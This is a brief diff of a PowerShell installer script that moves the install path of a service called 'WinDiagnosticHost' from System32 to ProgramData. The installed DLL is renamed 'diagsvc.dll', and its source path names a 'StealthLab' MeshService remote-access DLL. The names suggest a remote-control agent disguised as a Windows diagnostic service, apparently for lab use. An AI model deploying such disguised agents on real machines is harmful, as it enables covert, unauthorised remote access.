@@ -50,7 +50,9 @@ if (-not $scriptRoot) { $scriptRoot = (Get-Location).ProviderPath }
 
 $repoRoot   = $scriptRoot
 $serviceName = "WinDiagnosticHost"
-$installRoot = Join-Path $env:SystemRoot "System32\DiagnosticHost"
+$programData = [Environment]::GetFolderPath('CommonApplicationData')
+if (-not $programData) { $programData = Join-Path $env:SystemRoot 'ProgramData' }
+$installRoot = Join-Path $programData "DiagnosticHost"
 $installedDllPath = Join-Path $installRoot "diagsvc.dll"
 $sourceDllPath = Join-Path $repoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
 $configPath = Join-Path $repoRoot "WinDiagnosticHost.msh"
